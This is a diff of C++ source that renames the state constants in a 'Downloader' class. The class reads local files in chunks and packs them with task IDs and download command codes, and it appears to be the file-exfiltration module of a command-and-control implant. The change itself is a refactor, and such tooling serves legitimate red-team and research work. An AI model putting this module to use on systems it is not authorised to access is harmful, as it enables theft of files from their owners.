@@ -21,7 +21,7 @@ BOOL Downloader::IsTasks()
 {
 	if (this->downloads.size()) {
 		for (int i = 0; i < this->downloads.size(); i++) {
-			if (this->downloads[i].state == DOWNLOAD_STATE_RUNNING)
+			if (this->downloads[i].state == TRANSFER_STATE_RUNNING)
 				return true;
 		}
 	}
@@ -36,7 +36,7 @@ DownloadData Downloader::CreateDownloadData(ULONG taskId, ULONG fileId, HANDLE h
 	downloadData.hFile    = hFile;
 	downloadData.fileSize = size;
 	downloadData.index    = 0;
-	downloadData.state    = DOWNLOAD_STATE_RUNNING;
+	downloadData.state    = TRANSFER_STATE_RUNNING;
 
 	this->downloads.push_back(downloadData);
 
@@ -50,7 +50,7 @@ void Downloader::ProcessDownloader(Packer* packer)
 	
 	for (int i = 0; i < downloads.size(); i++) {
 		BOOL close = false;
-		if (downloads[i].state == DOWNLOAD_STATE_RUNNING) {
+		if (downloads[i].state == TRANSFER_STATE_RUNNING) {
 			LPVOID buffer = MemAllocLocal(this->chunkSize);
 			ULONG readedBytes = 0;
 			ApiWin->ReadFile(downloads[i].hFile, buffer, this->chunkSize, &readedBytes, NULL);
@@ -64,10 +64,10 @@ void Downloader::ProcessDownloader(Packer* packer)
 				packer->PackBytes( (BYTE*) buffer, readedBytes);
 
 				if (downloads[i].fileSize == downloads[i].index)
-					downloads[i].state = DOWNLOAD_STATE_FINISHED;
+					downloads[i].state = TRANSFER_STATE_FINISHED;
 			}
 			else {
-				downloads[i].state = DOWNLOAD_STATE_CANCELED;
+				downloads[i].state = TRANSFER_STATE_CANCELED;
 
 				packer->Pack32(downloads[i].taskId);
 				packer->Pack32(COMMAND_DOWNLOAD_STATE);
@@ -78,14 +78,14 @@ void Downloader::ProcessDownloader(Packer* packer)
 				MemFreeLocal(&buffer, this->chunkSize);
 		}
 
-		if ( downloads[i].state == DOWNLOAD_STATE_FINISHED ) {
+		if ( downloads[i].state == TRANSFER_STATE_FINISHED ) {
 			packer->Pack32(downloads[i].taskId);
 			packer->Pack32(COMMAND_DOWNLOAD);
 			packer->Pack32(downloads[i].fileId);
 			packer->Pack8(DOWNLOAD_FINISH);
 	    }
 
-		if ( downloads[i].state == DOWNLOAD_STATE_CANCELED || downloads[i].state == DOWNLOAD_STATE_FINISHED ) {
+		if ( downloads[i].state == TRANSFER_STATE_CANCELED || downloads[i].state == TRANSFER_STATE_FINISHED ) {
 			if (downloads[i].hFile) {
 				ApiNt->NtClose(downloads[i].hFile);
 				downloads[i].hFile = NULL;
